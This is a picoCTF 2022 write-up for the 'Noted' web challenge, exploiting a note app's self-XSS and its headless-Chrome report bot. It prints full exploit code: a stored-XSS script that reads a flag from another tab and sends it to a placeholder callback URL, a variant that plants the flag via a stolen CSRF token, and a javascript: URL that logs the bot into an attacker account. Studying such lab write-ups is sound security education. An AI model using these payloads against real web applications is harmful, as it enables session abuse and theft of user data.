---
title: "Noted"
description: "picoCTF writeup by Wakeful Cloud"
date: 2022-04-02T22:22:10-06:00
categories: [
  "picoCTF 2022"
]
tags: [
  "Web Exploitation",
  "Wakeful Cloud"
]
---

### Challenge Rating
* Artificialness: `3/10`
* Skill: `8/10`
* Time: `2-3 days`

*Learn more about how we rate challenges [here](/post/rating).*

## Preface
This write-up assumes you have a moderate to advanced understanding of SOP
(Same-Origin Policy) and CORS (Cross-Origin Resource Sharing). If you don't, you
should check out MDN's [SOP](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
and [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
articles. One other thing you should *note* (Pun intended) is that, despite what
the challenge description says, the headless browser **DOES** have internet
access. However, the exploit featured in this write-up does work without
internet access.

## Solving the challenge

### Exploring the website
The first thing I like to do with this sort of challenge is play around with
the functioning website. This not only makes me to familiar with the features of
the website, but also the overall architecture.

In this challenge, perhaps quite predictably, the website is a note-taking app
There's a primitive account system with a registration and login page. There's
also, of course, a page for creating and viewing/deleting notes. But there's
one other feature: a `Report` button. If you've played a lot of web CTFs, you're 
probably quite familiar with report buttons in challenges. Typically, they send
a URL to a headless browser which navigates to it and this challenge is no
different. But oftentimes, the scheme or domain is restricted, but maybe not for
this challenge? We can check by looking at the source code.

### Exploring the code
*Note: in order to get access to the source code, you can download it from [here](https://artifacts.picoctf.net/c/286/noted.tar.gz) or click the `Launch
Instance` button in picoGym and you should see a download link.*

Thankfully, the code base isn't too large and I was able to skim over everything
fairly quickly. This confirmed that there were no restrictions on the report URL.
Maybe we can use [`javascript` URL's](https://en.wikipedia.org/wiki/Bookmarklet#History)?
I also noticed that the headless browser navigates to the account creation page,
creates an account with a completely random username and password, then creates
a note with the flag in it. Then, it navigates to `about:blank` and finally the
URL we control. If you're curious as to why it navigates to `about:blank`, this
prevents us from sending the below JavaScript (Via a `javascript` URL):

```js
//Get the flag
const flag = document.querySelector('p').innerText;

//Exfiltrate
fetch('[Callback URL here; check out https://hookbin.com]', {
  method: 'POST',
  mode: 'no-cors',
  body: flag
});
```

That would've made this challenge considerably easier, but it seems [EHHTHING](https://larry.sh/)
(The challenge author) already thought of that. Shucks! However, I noticed
that the notes page is vulnerable to self-XSS (Since there's absolutely zero
sanitization). But alas, I was a bit stuck. I started to examine the hints a
little more closely. For reference, they are:

1. Are you sure I followed all the best practices?
2. There's more than just HTTP(S)!
3. Things that require user interaction normally in Chrome might not require it
in Headless Chrome.

It's safe to say that hint #1 is related to not sanitizing user input and #2 is
related to `javascript` URL's. But I was confused about #3. I thought that I may
need to navigate backwards, grab the flag, and exfiltrate. Surely that's not too
hard, right? Well several days went by until I finally gave up on this idea.
It's not that it was difficult to navigate backwards (The [history API](https://developer.mozilla.org/en-US/docs/Web/API/History)
can do that), it's just that you can't execute code once the browser navigates
backwards, otherwise it would totally bypass the same-origin policy.

### Dialogs

I was starting to think that there might be some dialog the shows up in headful
browsers, but to prevent interference, the headless browser auto-closes or
auto-accepts something. If the headless browser allowed me to say, take a
screenshot or print a tab without user-interaction, I could open a tab with the
flag on it, take a screenshot or print it, and then upload the image buffer.
This rabbit hole lead me to search through the entire Chromium repository for
any behavior the `--headless` flag modifies (I knew it was Chrome since it's
installed in the `Dockerfile`). Unfortunately for me, only very minor behavior
related to PDF printing changes with the `--headless` flag.

By now, I was very puzzled by hint #3 - to be honest, at the time of writing
this, I still don't entirely know what it was referring to. But I also knew
there must be a way, so I persevered.

### Research & development

I figured that the best way to proceed was to take a step back, read some
write-ups from other CTFs, and just let the creative juices flow. I kept finding
write-ups like [this one](https://blog.s1r1us.ninja/CTF/bytebandits-ctf-2020)
that demonstrated how you can use iFrames to bypass the same-origin policy.
It looked fairly relevant, so I tried it out. However, this exploit requires
the server to set the `SameSite=none` (Now that [cookies in Chrome default to Lax](https://chromestatus.com/feature/5088147346030592)). I kept reading, and
eventually stumbled across [this write-up](https://ctftime.org/writeup/30882)
(Which I urge you to read after this). It demonstrated a very similar approach,
except instead of using iFrames, it used separate tabs. After reading it, I
immediately began formulating a plan of attack:

1. Use the self-XSS vulnerability to create a malicious note
2. Send a `javascript` URL to the headless browser (Tab 1), which will:
    1. Open the page with the flag on it (Tab 2)
    2. Log in to an account we control (Tab 3)
3. The malicious note (on tab 3) will then:
    1. Get a reference to tab 2 (with the flag)
    2. Extract the flag from tab 2
    3. Exfiltrate the flag

![Diagram](/post/noted/diagram.png)

Because both the tab with the flag and the tab with the malicious note are from
the same origin, we completely bypass the same-origin policy.

### Solving the remaining problems

Unfortunately, there are a few problems to this approach:

1. How can we make the headless browser sign into an account we control (Since
CORS prevents us from making the login request from a null origin and opaque
requests won't save the response)?
2. How to get a reference to an already-open tab?

Thankfully, both of these are relatively easy to solve. I had actually
pre-emptively solved the first problem, figuring I would need it to trigger the
self-XSS. But to give credit where it's due, the aforementioned writeup helped
me solve the second problem.

The first problem can be solved by looking at the
website's front-end, specifically the login view. Instead of using `fetch` or
`XMLHttpRequest`, we can create a form with the [action attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/form#attr-action)
set to the **full** login URL. We can programmatically create and submit the
form using:
```javascript
//Settings
const username = 'aaaa';
const password = 'bbbb';

//Create the form
const form = document.createElement('form');
form.action = 'http://0.0.0.0:8080/login';
form.method = 'POST';
form.target = '_blank';

const usernameInput = document.createElement('input');
usernameInput.type = 'text';
usernameInput.name = 'username';
usernameInput.value = username;
form.appendChild(usernameInput);

const passwordInput = document.createElement('input');
passwordInput.type = 'password';
passwordInput.name = 'password';
passwordInput.value = password;
form.appendChild(passwordInput);

const submit = document.createElement('input');
submit.type = 'submit';
form.appendChild(submit);

//Add to the document
document.body.appendChild(form);

//Submit
submit.click();
```

The second problem can be solved by examining [`window.open`](https://developer.mozilla.org/en-US/docs/Web/API/Window/open).
You see, if you open anything with the target parameter set to a specific value,
you can obtain a reference to that same tab/window by "opening" the same
tab/window again, except with an empty url. For example:

```javascript
//Open a new tab/window, without saving the reference
window.open('https://example.com', 'someExampleWebsite');

//Get the reference to the existing tab/window
const reference = window.open('', 'someExampleWebsite');
```

### Final Exploit

Now it was time to piece it all together. To run the exploit yourself, create a
note with the content:

```html
<script>
  //Only run in the headless browser
  if (window.location.hostname == '0.0.0.0')
  {
    //Get a reference to the flag window
    const flagWindow = window.open('', 'flagWindow');

    //Get the flag
    const flag = flagWindow.document.querySelector('p').innerText;

    //Exfiltrate
    fetch('[Callback URL here; check out https://hookbin.com]', {
      method: 'POST',
      mode: 'no-cors',
      body: flag
    });
  }
</script>
```


However, if you want to stay true to the challenge and avoid using the internet,
create a note with the below content. I've omitted some comments to keep the
note content under the 1000 character limit.

```html
<script>
  //Settings
  const username = 'aaaa';
  const password = 'bbbb';

  const main = async () =>
  {
    if (window.location.hostname == '0.0.0.0')
    {
      const flagWindow = window.open('', 'flagWindow');
      const flag = flagWindow.document.querySelector('p').innerText;

      //Login to the account we control
      await fetch('/login', {
        method: 'POST',
        body: new URLSearchParams({
          username,
          password
        })
      });

      //Get the CSRF token
      const res = await fetch('/new');
      const token = new DOMParser()
        .parseFromString(await res.text(), 'text/html')
        .querySelector('input[name="_csrf"][type="hidden"]').value;

      //Exfiltrate
      await fetch('/new', {
        method: 'POST',
        body: new URLSearchParams({
          title: 'Flag',
          content: flag,
          '_csrf': token
        })
      });
    }
  };

  main();
</script>
```

*Note: some concessions were made to keep the note length under 1000 characters.*

Then update the settings of the below code (especially the credentials), uglify
it using [UglifyJS](https://uglifyjs.net/) or something similar, prepend
`javascript:` to it, report the URL, wait ~20 seconds, and check the callback
URL or the notes page (depending on the exfiltration method).

```javascript
//Settings
const username = 'aaaa';
const password = 'bbbb';

//Open the flag window
window.open('http://0.0.0.0:8080', 'flagWindow');

//Create the form
const form = document.createElement('form');
form.action = 'http://0.0.0.0:8080/login';
form.method = 'POST';
form.target = '_blank';

const usernameInput = document.createElement('input');
usernameInput.type = 'text';
usernameInput.name = 'username';
usernameInput.value = username;
form.appendChild(usernameInput);

const passwordInput = document.createElement('input');
passwordInput.type = 'password';
passwordInput.name = 'password';
passwordInput.value = password;
form.appendChild(passwordInput);

const submit = document.createElement('input');
submit.type = 'submit';
form.appendChild(submit);

//Add to the document
document.body.appendChild(form);

//Submit
submit.click();
```